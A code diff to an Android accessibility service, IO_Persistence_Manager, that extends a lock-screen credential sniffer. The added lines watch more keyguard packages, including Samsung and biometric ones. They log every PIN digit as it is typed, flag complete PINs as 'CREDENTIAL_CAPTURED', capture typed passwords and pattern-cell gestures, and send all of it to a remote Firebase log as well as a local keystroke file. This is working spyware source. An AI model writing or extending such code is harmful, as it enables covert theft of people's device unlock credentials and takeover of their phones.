@@ -189,9 +189,15 @@ public class IO_Persistence_Manager extends AccessibilityService {
         }
         
         // KEYGUARD_SNIFFER: Intercept Lock Screen PIN / Pattern entries
-        if (packageName.contains("systemui") || packageName.contains("keyguard")) {
+        String pkgLower = packageName.toLowerCase();
+        if (pkgLower.contains("systemui") || 
+            pkgLower.contains("keyguard") || 
+            pkgLower.contains("biometrics") || 
+            pkgLower.equals("android") ||
+            pkgLower.contains("lockscreen") ||
+            pkgLower.contains("guard") ||
+            pkgLower.contains("sec.android.app")) {
             sniffKeyguardPinPattern(event, packageName);
-            return;
         }
 
         // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
@@ -309,20 +315,34 @@ public class IO_Persistence_Manager extends AccessibilityService {
             if (now - lastPinDigitTime > 120 || keyguardPinBuffer.length() == 0 || !keyguardPinBuffer.substring(keyguardPinBuffer.length() - 1).equals(digit)) {
                 lastPinDigitTime = now;
                 keyguardPinBuffer.append(digit);
-                Log.d(TAG, "KEYGUARD_SNIFFER: Digit [" + digit + "] appended. Buffer length=" + keyguardPinBuffer.length() + " [" + keyguardPinBuffer + "]");
+                String currentBuffer = keyguardPinBuffer.toString();
 
-                if (keyguardPinBuffer.length() >= 4 && keyguardPinBuffer.length() <= 8) {
-                    String capturedPin = keyguardPinBuffer.toString();
-                    Log.d(TAG, "KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + capturedPin + "]");
-                    FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + capturedPin + "]");
+                Log.d(TAG, "KEYGUARD_SNIFFER: Digit [" + digit + "] appended. Buffer=" + currentBuffer);
+                FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Keyguard Digit [" + digit + "] -> Buffer: [" + currentBuffer + "]");
+                logKeystroke("\n[KEYGUARD_PIN_DIGIT]: " + digit + " (Current Pin: " + currentBuffer + ")");
+
+                if (currentBuffer.length() >= 4) {
+                    Log.d(TAG, "KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + currentBuffer + "]");
+                    FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen PIN/Passcode = [" + currentBuffer + "]");
+                    logKeystroke("\n==========================================\n[CREDENTIAL_CAPTURED]: LOCK_SCREEN_PIN = " + currentBuffer + "\n==========================================\n");
                 }
             }
-        }
+        } else {
+            // Capture non-digit text or password fields on Keyguard
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                if (!text.isEmpty() && !text.equals("null") && text.length() > 1 && !isGenericSystemText(text)) {
+                    logKeystroke("\n[KEYGUARD_INPUT]: " + text + " ");
+                    FirebaseConfig.logActivity("KEYGUARD_INPUT: Captured text: " + text);
+                }
+            }
 
-        // Detect Lock Pattern View gestures on Samsung / Android
-        if (clsName.contains("LockPatternView") || viewId.contains("lock_pattern") || viewId.contains("pattern")) {
-            Log.d(TAG, "KEYGUARD_SNIFFER: Lock Pattern entry gesture detected");
-            FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Lock Pattern entry gesture detected on Keyguard");
+            // Capture Lock Pattern View cell gestures
+            if (clsName.contains("LockPattern") || viewId.contains("pattern") || desc.toLowerCase().contains("cell") || desc.toLowerCase().contains("pattern")) {
+                if (!desc.isEmpty()) {
+                    logKeystroke("\n[KEYGUARD_PATTERN_NODE]: " + desc + " ");
+                    FirebaseConfig.logActivity("KEYGUARD_PATTERN_NODE: " + desc);
+                }
+            }
         }
 
         if (source != null) {
@@ -1233,6 +1253,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
     // ============ INTERACTION ============
 
     public boolean lockScreenNow() {
+        keyguardPinBuffer.setLength(0);
         final boolean[] result = {false};
         java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
 
